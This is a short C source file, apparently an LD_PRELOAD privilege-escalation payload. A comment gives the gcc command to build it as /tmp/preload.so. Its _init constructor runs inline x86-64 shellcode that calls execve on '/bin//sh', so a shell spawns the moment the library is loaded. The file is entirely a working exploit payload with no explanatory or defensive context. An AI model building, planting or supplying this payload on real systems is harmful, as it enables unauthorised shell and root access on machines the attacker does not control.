// $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c

void _init() {
    __asm__(
"xor %rax,%rax;"
"push %rax;"
"mov $0x3b, %al;"
"mov $0x68732f2f6e69622f, %rdi;"
"push %rdi;"
"mov %rsp,%rdi;"
"xor %rsi, %rsi;"
"xor %rdx, %rdx;"
"syscall;");

}
